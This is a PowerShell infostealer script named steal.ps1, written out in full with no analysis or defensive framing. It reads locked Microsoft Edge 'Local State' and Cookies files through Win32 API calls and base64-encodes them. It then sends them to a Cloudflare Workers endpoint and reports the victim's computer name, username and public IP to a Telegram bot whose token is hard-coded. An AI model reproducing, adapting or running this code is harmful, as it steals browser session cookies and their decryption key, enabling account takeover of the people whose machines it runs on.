# steal.ps1
# Uses Win32 API to read Edge files even when locked.

$t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
$c = "6760965981"
$worker_url = "https://reciever.tyceno89.workers.dev"

# Send PC info to Telegram
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
$body = @{ chat_id = $c; text = "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip" }
Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body

# --- Win32 API to read locked files ---
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32File
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToRead,
        out uint lpNumberOfBytesRead,
        IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public static byte[] ReadFileWithSharedAccess(string path)
    {
        const uint GENERIC_READ = 0x80000000;
        const uint FILE_SHARE_READ = 0x00000001;
        const uint FILE_SHARE_WRITE = 0x00000002;
        const uint OPEN_EXISTING = 3;

        IntPtr handle = CreateFile(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
        if (handle.ToInt64() == -1)
        {
            return null;
        }
        try
        {
            long length = new System.IO.FileInfo(path).Length;
            byte[] buffer = new byte[length];
            uint bytesRead = 0;
            if (ReadFile(handle, buffer, (uint)length, out bytesRead, IntPtr.Zero))
            {
                return buffer;
            }
            return null;
        }
        finally
        {
            CloseHandle(handle);
        }
    }
}
"@

# --- Read Local State ---
$src_ls = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
$bytes_ls = [Win32File]::ReadFileWithSharedAccess($src_ls)
if (-not $bytes_ls) {
    $body = @{ chat_id = $c; text = "ERROR: Could not read Local State" }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
    exit
}
$b64_ls = [Convert]::ToBase64String($bytes_ls)

# --- Read Cookies.db ---
$src_cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$bytes_cookies = [Win32File]::ReadFileWithSharedAccess($src_cookies)
if (-not $bytes_cookies) {
    $body = @{ chat_id = $c; text = "ERROR: Could not read Cookies.db" }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
    exit
}
$b64_cookies = [Convert]::ToBase64String($bytes_cookies)

# --- Send to worker ---
$payload = @{
    pc = $env:COMPUTERNAME
    user = $env:USERNAME
    files = @{
        "Edge_LocalState.json" = $b64_ls
        "Edge_Cookies.db" = $b64_cookies
    }
} | ConvertTo-Json -Depth 10

try {
    Invoke-RestMethod -Uri $worker_url -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
    $body = @{ chat_id = $c; text = "Both files sent successfully" }
} catch {
    $body = @{ chat_id = $c; text = "ERROR sending to worker: $_" }
}
Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
